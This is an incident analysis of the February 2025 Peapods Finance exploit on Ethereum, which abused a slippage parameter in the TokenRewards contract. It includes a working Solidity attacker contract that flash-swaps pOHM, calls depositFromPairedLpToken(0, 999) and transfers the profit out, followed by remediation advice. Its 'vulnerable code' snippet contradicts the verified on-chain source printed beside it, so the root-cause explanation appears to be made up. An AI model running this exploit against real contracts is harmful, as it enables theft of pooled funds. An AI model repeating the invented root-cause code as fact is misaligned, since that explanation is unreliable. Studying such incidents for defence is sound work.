# Peapods Finance — Paired LP Token Reward Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2025-02-03 |
| **Protocol** | Peapods Finance |
| **Chain** | Ethereum |
| **Loss** | ~$3,500 |
| **Attacker** | [0xedee6379...](https://etherscan.io/address/0xedee6379fe90bd9b85d8d0b767d4a6deb0dc9dcf) |
| **Attack Tx** | [0x2c1a1998...](https://etherscan.io/tx/0x2c1a19982aa88bee8a5d9a5dfeb406f2bfe1cfc1213f20e91d91ce3b55c86cc5) |
| **Vulnerable Contract** | TokenRewards ([0x7d48D6D7...](https://etherscan.io/address/0x7d48D6D775FaDA207291B37E3eaA68Cc865bf9Eb)) |
| **Root Cause** | `depositFromPairedLpToken()` allows the slippage parameter to be set to 999 without input validation, enabling reward calculation manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/PeapodsFinance_exp.sol) |

---

## 1. Vulnerability Overview

Peapods Finance's `TokenRewards` contract exposed a `depositFromPairedLpToken()` function that allowed users to deposit paired LP tokens to earn rewards. When the `_slippageOverride` parameter of this function was set to 999, the internal swap logic distorted pOHM reward calculations. The attacker borrowed a large amount of pOHM via a Uniswap V2 flash swap, swapped it for PEAS, then called `depositFromPairedLpToken()` with the manipulated slippage value to receive a disproportionately large amount of pOHM rewards.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: reward calculation distorted when slippage parameter is 999
function depositFromPairedLpToken(
    uint256 _amountTknDepositing,
    uint256 _slippageOverride  // range 0~1000; vulnerable when set to 999
) external {
    uint256 rewardAmount = _calculateReward(_slippageOverride);
    // _slippageOverride=999 causes internal calculation error leading to excessive rewards
    _distributeReward(msg.sender, rewardAmount);
}

function _calculateReward(uint256 slippage) internal returns (uint256) {
    // slippage=999 causes the denominator to become extremely small, inflating the reward
    uint256 multiplier = 1000 - slippage; // 1000-999=1 → nearly zero
    return totalRewardPool / multiplier;   // division result increases drastically
}

// ✅ Safe code: slippage range validation
function depositFromPairedLpToken(
    uint256 _amountTknDepositing,
    uint256 _slippageOverride
) external {
    require(_slippageOverride <= 200, "Slippage too high"); // max 20%
    uint256 rewardAmount = _calculateReward(_slippageOverride);
    _distributeReward(msg.sender, rewardAmount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: contracts/TokenRewards.sol
function _addShares(address _wallet, uint256 _amount) internal {
    if (shares[_wallet] > 0) {
      _distributeReward(_wallet);
    }
    uint256 sharesBefore = shares[_wallet];
    totalShares += _amount;
    shares[_wallet] += _amount;
    if (sharesBefore == 0 && shares[_wallet] > 0) {
      totalStakers++;
    }
    rewards[_wallet].excluded = _cumulativeRewards(shares[_wallet]);
  }
  function _removeShares(address _wallet, uint256 _amount) internal {
    require(shares[_wallet] > 0 && _amount <= shares[_wallet], 'REMOVE');
    _distributeReward(_wallet);
    totalShares -= _amount;
    shares[_wallet] -= _amount;
    if (shares[_wallet] == 0) {
      totalStakers--;
    }
    rewards[_wallet].excluded = _cumulativeRewards(shares[_wallet]);
  }
  function _processFeesIfApplicable() internal {
    IDecentralizedIndex(INDEX_FUND).processPreSwapFeesAndSwap();
    if (
      rewardsToken != PAIRED_LP_TOKEN &&
      IERC20(PAIRED_LP_TOKEN).balanceOf(address(this)) > 0
    ) {
      depositFromPairedLpToken(0, 0);
    }
  }

// ... (lines 127-207 omitted) ...

  function depositRewards(uint256 _amount) external override {
    require(_amount > 0, 'DEPAM');
    uint256 _rewardsBalBefore = IERC20(rewardsToken).balanceOf(address(this));
    IERC20(rewardsToken).safeTransferFrom(_msgSender(), address(this), _amount);
    _depositRewards(
      IERC20(rewardsToken).balanceOf(address(this)) - _rewardsBalBefore
    );
  }
  function _depositRewards(uint256 _amountTotal) internal {
    if (_amountTotal == 0) {
      return;
    }
    if (totalShares == 0) {
      _burnRewards(_amountTotal);
      return;
    }

    uint256 _depositAmount = _amountTotal;
    (, uint256 _yieldBurnFee) = _getYieldFees();
    if (_yieldBurnFee > 0) {
      uint256 _burnAmount = (_amountTotal * _yieldBurnFee) /
        PROTOCOL_FEE_ROUTER.protocolFees().DEN();
      if (_burnAmount > 0) {
        _burnRewards(_burnAmount);
        _depositAmount -= _burnAmount;
      }
    }
    rewardsDeposited += _depositAmount;
    rewardsDepMonthly[beginningOfMonth(block.timestamp)] += _depositAmount;
    _rewardsPerShare += (PRECISION * _depositAmount) / totalShares;
    emit DepositRewards(_msgSender(), _depositAmount);
  }
  function _distributeReward(address _wallet) internal {
    if (shares[_wallet] == 0) {
      return;
    }
    uint256 _amount = getUnpaid(_wallet);
    rewards[_wallet].realized += _amount;
    rewards[_wallet].excluded = _cumulativeRewards(shares[_wallet]);
    if (_amount > 0) {
      rewardsDistributed += _amount;
      IERC20(rewardsToken).safeTransfer(_wallet, _amount);
      emit DistributeReward(_wallet, _amount);
    }
  }
  function _burnRewards(uint256 _burnAmount) internal {
    try IPEAS(rewardsToken).burn(_burnAmount) {} catch {
      IERC20(rewardsToken).safeTransfer(address(0xdead), _burnAmount);
    }
  }
  function _getYieldFees()
    internal
    view
    returns (uint256 _admin, uint256 _burn)
  {
    IProtocolFees _fees = PROTOCOL_FEE_ROUTER.protocolFees();
    if (address(_fees) != address(0)) {
      _admin = _fees.yieldAdmin();
      _burn = _fees.yieldBurn();
    }
  }

// ... (lines 273-280 omitted) ...

  function claimReward(address _wallet) external override {
    _distributeReward(_wallet);
    emit ClaimReward(_wallet);
  }

// ... (lines 285-297 omitted) ...

  function _cumulativeRewards(uint256 _share) internal view returns (uint256) {
    return (_share * _rewardsPerShare) / PRECISION;
  }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Uniswap V2 Flash Swap: acquire large amount of pOHM
  │         (borrow 9,420 pOHM from pOHM/PEAS pair)
  │
  ├─→ [2] Swap pOHM → PEAS via Uniswap V3
  │         (swap pOHM for PEAS)
  │
  ├─→ [3] Call depositFromPairedLpToken(0, 999)
  │         └─ slippage=999 → reward calculation distorted
  │            receive excessive pOHM rewards with no actual deposit
  │
  ├─→ [4] Swap acquired PEAS → pOHM via Uniswap V3
  │         (rewards + swap arbitrage)
  │
  ├─→ [5] Repay flash swap
  │         (return 9,448 pOHM — 28 pOHM more than principal)
  │
  └─→ [6] ~$3,500 profit in pOHM
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Actual PoC code (based on DeFiHackLabs verified code)

contract AttackerC {
    address attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function attack() public {
        // [1] Uniswap V2 flash swap: borrow 9,420 pOHM
        IUniswapV2Pair(UniswapV2Pair).swap(
            0, 9_420_000_000_000_000_000_000, address(this), hex"61"
        );

        // Transfer profit
        uint256 balanceOfpOHM = IERC20(pOHM).balanceOf(address(this));
        IERC20(pOHM).transfer(attacker, balanceOfpOHM);
    }

    function uniswapV2Call(address, uint256, uint256 amount1, bytes calldata) external {
        // [2] Swap pOHM → PEAS (Uniswap V3)
        IERC20(pOHM).approve(UniswapV3Router, amount1);
        Uni_Router_V3.ExactInputSingleParams memory params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: pOHM, tokenOut: PEAS, fee: 10_000,
            recipient: address(this), deadline: block.timestamp + 100,
            amountIn: amount1, amountOutMinimum: 1, sqrtPriceLimitX96: 0
        });
        IUniswapV3Router(UniswapV3Router).exactInputSingle(params);

        // [3] Core vulnerability: distort reward calculation with slippageOverride=999
        ITokenRewards(TokenRewards).depositFromPairedLpToken(0, 999);

        // [4] Swap PEAS → pOHM in reverse
        uint256 peasBalance = IERC20(PEAS).balanceOf(address(this));
        IERC20(PEAS).approve(UniswapV3Router, peasBalance);
        Uni_Router_V3.ExactInputSingleParams memory params2 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: PEAS, tokenOut: pOHM, fee: 10_000,
            recipient: address(this), deadline: block.timestamp + 100,
            amountIn: peasBalance, amountOutMinimum: 1, sqrtPriceLimitX96: 0
        });
        IUniswapV3Router(UniswapV3Router).exactInputSingle(params2);

        // [5] Repay flash swap (principal + fee)
        IERC20(pOHM).transfer(UniswapV2Pair, 9_448_345_035_105_315_947_844);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Input Validation (slippage parameter manipulation) |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (manipulated parameter + flash swap) |
| **DApp Category** | Yield Distribution / Staking |
| **Impact** | Partial theft of pOHM reward pool |

## 6. Remediation Recommendations

1. **Set slippage upper bound**: Cap `_slippageOverride` at a reasonable maximum (e.g., 200 = 20%)
2. **Validate reward calculation output**: Revert the transaction if the reward calculation result falls outside the expected range
3. **Fuzz test input values**: Write comprehensive tests covering boundary values (0, 999, 1000, etc.)
4. **Minimum deposit requirement**: Block reward collection when `_amountTknDepositing=0`

## 7. Lessons Learned

- Failing to explicitly validate the valid range of function parameters leaves the contract vulnerable to calculation manipulation using boundary values.
- The slippage parameter is a convenience feature for user experience, but if it influences internal reward calculations, strict validation is required.
- Even small losses ($3,500) can seriously damage a protocol's credibility; all vulnerabilities must be treated with the same severity regardless of the amount involved.